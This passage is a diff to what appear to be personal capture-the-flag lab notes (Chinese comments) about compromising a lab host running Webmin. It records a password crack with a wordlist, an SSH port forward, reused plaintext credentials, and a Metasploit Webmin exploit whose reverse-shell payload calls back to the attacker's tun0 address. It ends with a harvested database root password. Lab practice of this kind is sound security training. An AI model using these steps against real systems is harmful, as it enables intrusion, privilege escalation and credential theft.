@@ -62,7 +62,53 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
 
 
 #转发
-ssh -L 10000:localhost:10000 agent47@10.10.107.45
+ssh -L 10000:localhost:10000 agent47@10.10.27.20
 
 #本地访问
 http://localhost:10000
+
+#web登录密码也是
+agent47：videogamer124
+
+
+#msf 提权
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > options
+
+Module options (exploit/unix/webapp/webmin_show_cgi_exec):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   PASSWORD  videogamer124    yes       Webmin Password
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS    127.0.0.1        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT     10000            yes       The target port (TCP)
+   SSL       false            yes       Use SSL
+   USERNAME  agent47          yes       Webmin Username
+   VHOST                      no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin 1.580
+
+
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set lhost tun0
+lhost => 10.13.21.169
+msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run
+
+
+
+
+#数据库密码
+/var/www/html/index.php 
+root:3kSMMS47qZEBgFUe
